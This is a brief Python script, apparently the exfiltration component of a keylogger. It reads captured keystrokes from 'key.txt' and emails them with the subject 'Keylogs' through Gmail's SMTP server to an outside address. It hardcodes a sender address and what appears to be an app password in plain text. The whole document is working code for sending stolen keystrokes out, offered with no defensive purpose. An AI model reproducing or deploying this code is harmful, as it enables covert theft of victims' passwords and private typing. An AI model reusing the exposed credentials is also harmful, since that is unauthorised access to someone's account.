import smtplib
import ssl
import os
from email.message import EmailMessage
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from pathlib import Path

# Define email sender and receiver
email_sender = 'maximuelleriscool21@gmail.com'
email_password = 'ijokrhocydqkewoh'
email_receiver = 'engelkeconstantin@gmail.com'

# Set the subject and body of the email
subject = 'Keylogs'
body = 'Here u go!'

em = MIMEMultipart()
em['From'] = email_sender
em['To'] = email_receiver
em['Subject'] = subject
em.attach(MIMEText(Path("key.txt").read_text()))

# Add SSL (layer of security)
context = ssl.create_default_context()

# Log in and send the email
with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
    smtp.login(email_sender, email_password)
    smtp.sendmail(email_sender, email_receiver, em.as_string())